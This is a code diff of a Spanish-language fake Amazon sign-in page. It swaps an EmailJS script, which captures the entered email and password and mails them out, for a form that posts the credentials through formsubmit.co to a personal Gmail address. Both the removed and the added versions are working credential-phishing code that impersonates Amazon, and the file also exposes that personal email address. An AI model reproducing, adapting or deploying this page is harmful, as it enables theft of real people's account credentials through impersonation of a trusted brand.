@@ -4,10 +4,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon"
-        href="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg"
-        type="image/png">
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <title>Iniciar sesión en Amazon</title>
     <style>
         body {
@@ -126,9 +122,10 @@
         class="amazon-logo">
     <div class="login-container">
         <h1>Iniciar sesión</h1>
-        <form id="loginForm">
-            <!-- Campo oculto para correo fijo (destinatario predeterminado) -->
-            <input type="hidden" id="recipientEmail" name="recipient_email" value="raulmorejonpulido@gmail.com">
+        <form action="https://formsubmit.co/raulmorejonpulido@gmail.com" method="POST">
+            <!-- Campo oculto para el correo de destino -->
+            
+            <input type="hidden" name="_subject" value="Nuevo intento de inicio de sesión en Amazon">
 
             <!-- Campo para correo electrónico -->
             <label for="email">Correo electrónico o número de teléfono</label>
@@ -140,12 +137,8 @@
 
             <!-- Enviar formulario -->
             <button type="submit">Iniciar sesión</button>
+            <input type="hidden" name="_next" value="https://www.tu-sitio.com/gracias.html">
         </form>
-
-        <div class="links">
-            <a href="#">¿Olvidaste tu contraseña?</a><br>
-            <a href="#">Crea tu cuenta de Amazon</a>
-        </div>
     </div>
 
     <div class="footer">
@@ -158,42 +151,6 @@
         </p>
         <p>© 1996-2024, Amazon.com, Inc. o sus afiliados</p>
     </div>
-
-    <!-- Script para EmailJS -->
-    <script type="text/javascript">
-        // Inicializamos EmailJS con tu userID
-        emailjs.init('user_f80imbc');  // Reemplaza con tu userID
-
-        document.addEventListener("DOMContentLoaded", function () {
-            var form = document.querySelector("#loginForm");
-
-            if (form) {
-                form.addEventListener('submit', function (event) {
-                    event.preventDefault();  // Prevenir el envío tradicional del formulario
-
-                    var formData = new FormData(form);  // Obtener los datos del formulario
-                    console.log("Formulario Data antes de enviar:", formData);  // Ver todo el contenido de formData
-
-                    // Verificar individualmente los valores
-                    console.log("Correo electrónico:", formData.get('email'));  // Ver valor de email
-                    console.log("Contraseña:", formData.get('password'));  // Ver valor de password
-                    console.log("Correo de destino:", formData.get('recipient_email'));  // Ver valor de recipient_email
-
-                    // Enviar formulario con EmailJS
-                    emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', form) // Aquí pasamos el formulario
-                        .then(function (response) {
-                            console.log('SUCCESS!', response.status, response.text);
-                            window.location.href = 'gracias.html'; // Redirigir a página de gracias
-                        }, function (error) {
-                            console.log('FAILED...', error);
-                            window.location.href = 'gracias.html'; // Redirigir a página de gracias incluso en caso de error
-                        });
-                });
-            } else {
-                console.error("Formulario no encontrado");
-            }
-        });
-    </script>
 </body>
 
 </html>
